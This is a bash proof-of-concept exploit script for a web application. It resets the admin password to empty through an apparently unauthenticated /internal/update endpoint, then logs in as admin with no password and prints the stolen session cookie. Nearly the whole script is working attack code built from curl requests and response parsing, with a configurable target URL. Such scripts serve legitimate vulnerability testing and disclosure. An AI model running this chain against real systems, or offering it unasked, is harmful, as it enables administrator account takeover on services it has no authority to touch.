#!/bin/bash

# POC: Empty Password Login Bypass
# Description: Demonstrates that the login endpoint accepts empty passwords
# This allows an attacker to login with just a username when combined with 
# unauthenticated password reset vulnerability

TARGET_URL="${1:-http://localhost:3000}"
TEST_USERNAME="admin"

echo "[*] Testing Empty Password Login Bypass"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: First reset admin password to empty via unauthenticated /internal/update
echo "[*] Step 1: Resetting admin password to empty via /internal/update"
RESET_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/internal/update?username=$TEST_USERNAME&newpassword=" 2>&1)
echo "$RESET_RESPONSE" | head -20
echo ""

# Check if reset was successful
if echo "$RESET_RESPONSE" | grep -q "200 OK\|Password reset"; then
    echo "[+] Password reset appears successful (HTTP 200)"
else
    echo "[-] Password reset response unclear, continuing anyway..."
fi
echo ""

# Test 2: Now attempt login with empty password
echo "[*] Step 2: Attempting login with empty password"
echo "[*] Command: curl -i -X POST \"$TARGET_URL/login\" -d \"username=$TEST_USERNAME&password=\""
echo ""

LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/login" \
  -d "username=$TEST_USERNAME&password=" \
  2>&1)

echo "$LOGIN_RESPONSE"
echo ""

# Parse response to check for success indicators
echo "[*] Analyzing response..."
if echo "$LOGIN_RESPONSE" | grep -q "302 FOUND\|Location: /profile"; then
    echo "[+] VULNERABLE: Login accepted with empty password!"
    echo "[+] Server returned 302 redirect to /profile"
    
    # Extract session cookie if present
    if echo "$LOGIN_RESPONSE" | grep -qi "Set-Cookie: session="; then
        echo "[+] Session cookie was set - authentication successful"
        SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | head -1 | cut -d' ' -f2 | cut -d';' -f1)
        echo "[+] Session: $SESSION_COOKIE"
    fi
    
    exit 0
elif echo "$LOGIN_RESPONSE" | grep -q "200 OK"; then
    if echo "$LOGIN_RESPONSE" | grep -q "profile\|dashboard\|authenticated"; then
        echo "[+] VULNERABLE: Login accepted with empty password!"
        exit 0
    fi
fi

echo "[-] Could not confirm vulnerability"
echo ""
echo "[*] Full response headers:"
echo "$LOGIN_RESPONSE" | head -30
exit 1